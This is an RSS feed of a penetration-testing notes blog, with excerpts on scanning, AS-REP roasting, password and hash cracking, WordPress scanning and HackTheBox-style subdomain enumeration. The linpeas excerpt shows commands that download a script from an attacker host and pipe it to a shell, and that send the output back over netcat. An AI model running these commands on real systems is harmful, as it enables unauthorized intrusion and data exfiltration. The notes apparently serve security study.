<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pentest on Braindump</title>
    <link>https://kdbed.github.io/tags/pentest/</link>
    <description>Recent content in pentest on Braindump</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="https://kdbed.github.io/tags/pentest/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Active Scanning with Scapy</title>
      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.
SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
    </item>
    
    <item>
      <title>AS-REP Roasting</title>
      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
    </item>
    
    <item>
      <title>Cracking - PDF</title>
      <link>https://kdbed.github.io/posts/cracking_pdf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/cracking_pdf/</guid>
      <description>fcrackzip fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt </description>
    </item>
    
    <item>
      <title>FTP - retrieve files with Python</title>
      <link>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</guid>
      <description></description>
    </item>
    
    <item>
      <title>linpeas</title>
      <link>https://kdbed.github.io/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/linpeas/</guid>
      <description>See carlospolop : PEASS-ng hacktricks
Execution: Run from memory and send back to attacker:
# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
    </item>
    
    <item>
      <title>Pentest - SSH</title>
      <link>https://kdbed.github.io/posts/pentest_ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_ssh/</guid>
      <description>Pentesting SSH ssh-audit Install
sudo apt install ssh-audit </description>
    </item>
    
    <item>
      <title>Recon - Port Scanning and nmap</title>
      <link>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</guid>
      <description>Basic nmap scan nmap -sC -sV -oA nmap/result &amp;lt;ip&amp;gt; Flags:
-oA &amp;lt;basename&amp;gt;: Output in the three major formats at once -sV: Probe open ports to determine service/version info -sC: default scripts </description>
    </item>
    
    <item>
      <title>sha1Cracker</title>
      <link>https://kdbed.github.io/posts/sha1cracker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
    </item>
    
    <item>
      <title>Subdomain Enumeration</title>
      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):
sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:
sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 </description>
    </item>
    
    <item>
      <title>Web Pentest - Wordpress</title>
      <link>https://kdbed.github.io/posts/web_pentest_wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/web_pentest_wordpress/</guid>
      <description>Wordpress WPScan Enumerate vulnerable plugins, users, db exports:
wpscan --url &amp;lt;url&amp;gt; -e dbe,u,vp </description>
    </item>
    
  </channel>
</rss>
